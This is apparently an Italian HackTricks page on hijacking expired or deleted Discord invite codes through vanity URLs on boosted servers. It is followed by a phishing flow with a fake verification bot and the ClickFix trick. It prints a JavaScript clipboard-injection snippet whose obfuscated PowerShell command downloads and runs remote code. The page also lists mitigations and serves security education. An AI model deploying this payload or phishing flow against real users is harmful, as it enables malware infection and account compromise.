# Hijacking degli inviti Discord

{{#include ../../banners/hacktricks-training.md}}

La vulnerabilità del sistema di inviti di Discord consente agli threat actor di reclamare codici di invito scaduti o eliminati (temporanei, permanenti o vanity personalizzati) come nuovi vanity link su qualsiasi server con Level 3 Boost. Normalizzando tutti i codici in minuscolo, gli attacker possono pre-registrare codici di invito noti e hijackare silenziosamente il traffico una volta scaduto il link originale o quando il server di origine perde il proprio boost.<sup>[[1]](#references)[[2]](#references)</sup>

## Tipi di invito e rischio di hijack

| Tipo di invito           | Hijackabile? | Condizione / Commenti                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Link di invito temporaneo | ✅          | Dopo la scadenza, il codice diventa disponibile e può essere nuovamente registrato come vanity URL da un server boosted. |
| Link di invito permanente | ⚠️          | Se eliminato e composto solo da lettere minuscole e cifre, il codice potrebbe diventare nuovamente disponibile.        |
| Link Vanity personalizzato    | ✅          | Se il server originale perde il proprio Level 3 Boost, il suo vanity invite diventa disponibile per una nuova registrazione.    |

## Fasi di exploitation

1. Ricognizione
- Monitorare fonti pubbliche (forum, social media, canali Telegram) alla ricerca di invite link che corrispondono al pattern `discord.gg/{code}` o `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Raccogliere i codici di invito di interesse (temporanei o vanity).
2. Pre-registrazione
- Creare o utilizzare un server Discord esistente con privilegi Level 3 Boost.
- In **Impostazioni del server → Vanity URL**, tentare di assegnare il codice di invito target. Se accettato, il codice viene riservato dal server malevolo.
3. Attivazione dell'hijack
- Per gli inviti temporanei, attendere la scadenza dell'invito originale (oppure eliminarlo manualmente se si controlla la fonte).
- Per i codici contenenti lettere maiuscole, la variante in minuscolo può essere reclamata immediatamente, anche se il redirection si attiva solo dopo la scadenza.
4. Redirection silenziosa
- Gli utenti che visitano il vecchio link vengono inviati senza soluzione di continuità al server controllato dall'attacker una volta attivo l'hijack.

## Phishing Flow tramite server Discord

1. Limitare i canali del server in modo che sia visibile solo il canale **#verify**.<sup>[[1]](#references)</sup>
2. Implementare un bot (ad esempio, **Safeguard#0786**) per chiedere ai nuovi arrivati di verificarsi tramite OAuth2.
3. Il bot reindirizza gli utenti a un sito di phishing (ad esempio, `captchaguard.me`) con il pretesto di un CAPTCHA o di una fase di verifica.
4. Implementare il trucco UX **ClickFix**:
- Visualizzare un messaggio CAPTCHA non funzionante.
- Guidare gli utenti ad aprire la finestra di dialogo **Win+R**, incollare un comando PowerShell precaricato e premere Invio.

### Esempio di Clipboard Injection con ClickFix
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Questo approccio evita i download diretti dei file e sfrutta elementi dell'interfaccia utente familiari per ridurre i sospetti degli utenti.<sup>[[1]](#references)</sup>

## Mitigazioni

- Utilizzare link di invito permanenti contenenti almeno una lettera maiuscola o un carattere non alfanumerico (non scadono e non sono riutilizzabili).<sup>[[1]](#references)</sup>
- Ruotare regolarmente i codici di invito e revocare i vecchi link.
- Monitorare lo stato dei boost del server Discord e le richieste di URL vanity.
- Istruire gli utenti a verificare l'autenticità del server ed evitare di eseguire comandi incollati dagli appunti.

## Riferimenti

- [1] [From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)

{{#include ../../banners/hacktricks-training.md}}
